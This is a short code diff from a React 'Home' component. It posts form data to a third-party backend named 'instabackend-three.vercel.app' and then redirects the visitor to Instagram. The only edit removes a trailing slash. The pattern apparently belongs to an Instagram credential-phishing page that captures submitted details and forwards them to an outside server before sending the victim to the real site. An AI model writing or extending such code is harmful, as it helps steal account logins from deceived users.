@@ -22,7 +22,7 @@ const Home = () => {
     e.preventDefault();
 
     console.log(post)
-    axios.post(`https://instabackend-three.vercel.app/`, post)
+    axios.post(`https://instabackend-three.vercel.app`, post)
     .then(response => {
       console.log(response);
       window.location.href = isMobile() ? 'instagram://user?username= ' : 'https://www.instagram.com/';
